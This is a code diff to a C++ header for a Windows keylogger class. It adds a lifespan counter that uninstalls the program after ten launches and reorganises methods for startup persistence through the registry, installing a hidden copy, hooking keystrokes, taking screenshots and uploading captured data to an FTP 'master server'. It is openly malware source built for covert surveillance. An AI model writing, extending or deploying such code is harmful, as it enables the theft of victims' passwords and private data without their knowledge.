@@ -23,8 +23,9 @@
 
 #include "screenshot.h"
 
-//registry key for persistence
+//registry keys
 #define REGKEY_PERSIST "keylogger"
+#define REGKEY_LIFETIME "lifespan"
 
 //keyboard scan codes
 #define SC_CTRL 29
@@ -53,6 +54,9 @@
 //name of the file receiving key strokes
 #define KEYSTROKES_FILE "keys.html"
 
+//life time of the keylogger (i.e. number of launches before uninstalling it)
+#define KEYLOGGER_LIFETIME "10"
+
 class KeyLogger {
 
     public:
@@ -64,18 +68,18 @@ class KeyLogger {
     //starts listenning
     void listen();
     
-    //makes the program launch at startup
-    void persist(std::string path = "");
+    //installs a persistent copy
+    void install(std::string target);
 
     //erases program data
-    void purge();
+    void uninstall();
 
     //loop for standalone usage
     void loop();
-
-    //installs a persistent copy
-    void install(std::string target);
     
+    //setup FTP master server
+    void setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir = ".");
+
     //get user home directory
     std::string getUserHomeDirectory();
 
@@ -95,9 +99,6 @@ class KeyLogger {
     bool KeyLogger::isRShiftDown() { return rshiftDown; }
     void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
-    //setup FTP master server
-    void setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir=".");
-
     protected:
 
     KeyLogger();
@@ -116,10 +117,16 @@ class KeyLogger {
     std::string getActiveWindowTitle();
 
     std::string removeFilespec(std::string path);
+    
+    //decreases keylogger's life time and uninstall it if it's time
+    void updateLifespan();
 
     void writeBuffer();
 
     void upload();
+    
+    //makes the program launch at startup
+    void persist(std::string path = "");
 
     static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
 
